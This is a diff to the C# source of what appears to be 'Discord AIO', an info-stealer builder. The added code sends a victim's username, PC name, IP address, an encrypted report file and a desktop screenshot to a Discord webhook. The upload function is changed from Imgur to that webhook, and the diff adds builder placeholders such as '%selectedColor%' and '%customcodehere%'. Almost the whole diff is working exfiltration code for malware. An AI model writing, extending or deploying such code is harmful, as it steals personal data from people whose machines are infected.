@@ -20,8 +20,6 @@ using System.Text.RegularExpressions;
 using System.Linq;
 using System.Security.Principal;
 using System.Security.Cryptography;
-using RestSharp;
-using Newtonsoft.Json.Linq;
 using System.Management;
 using System.Xml;
 
@@ -82,7 +80,7 @@ namespace DiscordAIO
 			Dictionary<string, object> postParameters = new Dictionary<string, object>();
 			postParameters.Add("username", "Discord AIO");
 			postParameters.Add("content", mssg);
-			postParameters.Add("avatar_url", "https://i.imgur.com/BDfuGjz.jpg");
+			postParameters.Add("avatar_url", "https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png");
 			HttpWebResponse webResponse = FormUpload.MultipartFormDataPost(Webhook, "Discord AIO", postParameters);
 			StreamReader responseReader = new StreamReader(webResponse.GetResponseStream());
 			string fullResponse = responseReader.ReadToEnd();
@@ -100,9 +98,34 @@ namespace DiscordAIO
 			Dictionary<string, object> postParameters = new Dictionary<string, object>();
 			postParameters.Add("filename", filename);
 			postParameters.Add("fileformat", fileformat);
-			postParameters.Add("file", new FormUpload.FileParameter(data, filename, application/*"application/msexcel"*/));
+			postParameters.Add("file", new FormUpload.FileParameter(data, filename, application));
 			postParameters.Add("username", "Discord AIO");
 			postParameters.Add("content", mssgBody);
+			postParameters.Add("avatar_url", "https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png");
+
+
+
+			HttpWebResponse webResponse = FormUpload.MultipartFormDataPost(Webhook, "Discord AIO", postParameters);
+			StreamReader responseReader = new StreamReader(webResponse.GetResponseStream());
+			string fullResponse = responseReader.ReadToEnd();
+			webResponse.Close();
+
+			return fullResponse;
+		}
+
+		public static string SendPhoto(string filename, string fileformat, string filepath, string application)
+		{
+			FileStream fs = new FileStream(filepath, FileMode.Open, FileAccess.Read);
+			byte[] data = new byte[fs.Length];
+			fs.Read(data, 0, data.Length);
+			fs.Close();
+			Dictionary<string, object> postParameters = new Dictionary<string, object>();
+			postParameters.Add("filename", filename);
+			postParameters.Add("fileformat", fileformat);
+			postParameters.Add("file", new FormUpload.FileParameter(data, filename, application));
+			postParameters.Add("username", "Discord AIO");
+			postParameters.Add("avatar_url", "https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png");
+
 			HttpWebResponse webResponse = FormUpload.MultipartFormDataPost(Webhook, "Discord AIO", postParameters);
 			StreamReader responseReader = new StreamReader(webResponse.GetResponseStream());
 			string fullResponse = responseReader.ReadToEnd();
@@ -633,28 +656,23 @@ namespace DiscordAIO
 
 		static void upload()
 		{
-			string link = "N/A";
-			byte[] imgData = File.ReadAllBytes("des.png");
-			var client = new RestClient("https://api.imgur.com/3/image");
-			client.Timeout = -1;
-			var request = new RestRequest(Method.POST);
-			request.AddHeader("Authorization", "Client-ID cad5fec68864c1f");
-			request.AlwaysMultipartFormData = true;
-			request.AddFileBytes("image", imgData, "des.png", "multipart/form-data");
-			IRestResponse response = client.Execute(request);
-			JObject obj = JObject.Parse(response.Content);
+			string fileformat = "png";
+			string filepath = Handler.ExploitDirectory + "\\des.png";
+			string application = "";
+			try
+			{
+				DiscordWebhook.SendPhoto("des.png", fileformat, filepath, application);
+			}
+			catch (Exception ex)
+			{
+				MessageBox.Show(ex.Message);
+				DiscordWebhook.Send("Unable to send desktop screenshot.");
+			}
 
 			if (File.Exists("des.png"))
 			{
 				File.Delete("des.png");
 			}
-
-			bool success = bool.Parse(obj["success"].ToString());
-			link = obj["data"]["link"].ToString();
-
-			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# Pictures \n");
-			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\npicURL: " + link + " | \n");
-			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# End of Pictures \n");
 		}
 
 		public static void Piccc()
@@ -2755,7 +2773,7 @@ namespace DiscordAIO
 
 		public static void CustomPlugin()
 		{
-			//customcodehere
+			//%customcodehere%;
 		}
 
 		public static void TakePicture()
@@ -2811,19 +2829,21 @@ namespace DiscordAIO
 
 			//jumpscare
 
-			//takepic
-
 			string textDAIO = File.ReadAllText(Handler.ExploitDir + "\\" + hisName.howtonameit);
 			string encryption = Cipher.Encrypt(textDAIO);
 			textDAIO = textDAIO.Replace(textDAIO, encryption);
 			File.WriteAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, textDAIO);
 
-			string mssgBody =
-				"\n **New Discord AIO report**" +
-				"\n" +
-				"\n Username: " + Environment.UserName +
-				"\n PC name: " + Environment.MachineName +
-				"\n IP: " + ip;
+
+
+			string myColor = %selectedColor%.ToString();
+			string messageToEmbed =
+				"```diff" +
+				"\nNew report ⚠\n" +
+				"\n-  Username: " + Environment.UserName +
+				"\n-  PC Name: " + Environment.MachineName +
+				"\n-  IP Address: " + ip +
+				"\n```";
 
 			string fileformat = "dAIO";
 			string filepath = Handler.ExploitDir + "\\" + hisName.howtonameit;
@@ -2831,12 +2851,14 @@ namespace DiscordAIO
 
 			try
 			{
-				DiscordWebhook.SendFile(mssgBody, hisName.howtonameit, fileformat, filepath, application);
+				DiscordWebhook.SendFile(messageToEmbed, hisName.howtonameit, fileformat, filepath, application);
 			}
 			catch
 			{
 				DiscordWebhook.Send("Report size is more then 8 MB. Sending isn`t available.");
 			}
+
+			//takepic
 
 			//custom
 
